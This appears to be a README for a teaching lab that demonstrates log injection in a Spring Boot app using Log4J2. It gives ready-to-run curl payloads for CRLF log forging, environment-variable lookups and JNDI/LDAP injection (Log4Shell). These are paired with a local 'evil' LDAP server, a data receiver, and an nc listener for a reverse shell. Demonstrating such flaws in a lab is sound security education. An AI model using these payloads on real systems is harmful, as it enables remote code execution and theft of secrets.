# Log Injection with Spring Boot and Log4J2

## Usage

Testé avec Java 17. 
Mettre à jour la variable d'environnement JAVA_HOME si nécessaire.

- Run

```shell
./gradlew bootRun
```

- Request

```shell
curl http://localhost:8080/\?name\=Frodon
```

## Hack

### Using CRLF injection

```shell
curl http://localhost:8080/\?name\=Marty%0d%0a2023-09-08%2010%3A40%3A01.108%20DEBUG%202175773%20---%20%5Bnio-8080-exec-1%5D%20n.e.d.HelloController%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3A%20You%20have%20been%20pwed%0A
```

### Using date lookup

Date lookup ``${date:yyyyMMdd-HHmmss}``:

```shell
curl http://localhost:8080/\?name\=%24%7Bdate%3AyyyyMMdd-HHmmss%7D
```

### Using env lookup

Env lookup ``${env:USER}``:

```shell
curl http://localhost:8080/\?name\=%24%7Benv%3AUSER%7D
```

### Using JNDI Injection + LDAP (OpenKeyPassExploit)

- Run the evil ldap server

```shell
javac evil/ldap/OpenKeyPassExploit.java
python evil/ldap/server.py OpenKeyPassExploit
```

- JNDI LDAP lookup

```shell
curl http://localhost:8080/\?name\=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A1389%2FanyString%7D
```

### Using JNDI Injection + LDAP (StealEnvUserNameExploit)

- Run the evil ldap & receiver server

```shell
javac evil/ldap/StealEnvUserNameExploit.java
python evil/ldap/server.py StealEnvUserNameExploit
python evil/receiver/server.py
```

- JNDI LDAP lookup

```shell
curl http://localhost:8080/\?name\=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A1389%2FanyString%7D
```

### Using JNDI Injection + LDAP (ReverseShellExploit)

- Run the evil ldap

```shell
javac evil/ldap/ReverseShellExploit.java
python evil/ldap/server.py ReverseShellExploit
```

- Listening for incoming (evil)

```shell
nc -lv 9001
```

- JNDI LDAP lookup

```shell
curl http://localhost:8080/\?name\=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A1389%2FanyString%7D
```
